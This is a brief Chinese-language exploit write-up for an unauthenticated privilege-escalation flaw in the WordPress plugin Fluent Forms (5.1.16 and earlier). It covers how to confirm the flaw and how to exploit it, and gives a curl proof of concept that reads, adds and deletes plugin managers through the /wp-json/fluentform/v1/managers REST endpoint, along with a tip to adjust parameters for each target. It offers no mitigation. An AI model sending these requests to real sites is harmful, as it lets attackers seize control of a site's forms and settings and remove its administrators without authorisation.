验证漏洞存在方法
    - 检查是否存在/wp-json/fluentform/v1/managers REST API端点
    - 测试未授权访问该端点是否能够添加或删除管理员账户

漏洞利用方法
    - 通过未授权访问/wp-json/fluentform/v1/managers REST API端点进行权限提升
    - 该漏洞允许未认证攻击者授予用户Fluent Form管理权限，从而访问插件的所有设置和功能
    - 攻击者还可以删除现有的管理员账户
    
PoC
```bash
# 检查REST API端点是否存在
curl -X GET "http://target-site.com/wp-json/fluentform/v1/managers"

# 尝试添加管理员（示例请求）
curl -X POST "http://target-site.com/wp-json/fluentform/v1/managers" \
  -H "Content-Type: application/json" \
  -d '{"user_id": 1, "permissions": "all"}'

# 尝试删除管理员（示例请求）
curl -X DELETE "http://target-site.com/wp-json/fluentform/v1/managers/1"
```

注意：实际利用可能需要根据目标站点的具体配置调整请求参数。此漏洞影响Fluent Forms Contact Form插件5.1.16及之前的所有版本。
